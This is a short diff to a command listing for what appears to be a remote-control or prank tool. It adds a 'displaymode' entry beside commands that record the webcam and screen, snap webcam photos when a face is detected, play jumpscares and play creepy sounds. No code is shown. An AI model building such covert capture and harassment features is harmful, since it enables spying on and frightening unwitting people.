@@ -16,6 +16,7 @@ webcamclip - Record webcam.
 screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
 waitforface - Send a webcam photo when face is detected till timeout.
+displaymode - Send a display set menu.
 🔊 Audio & Volume
 breath - Play breathing sound.
 pss - Play "psst" sound.
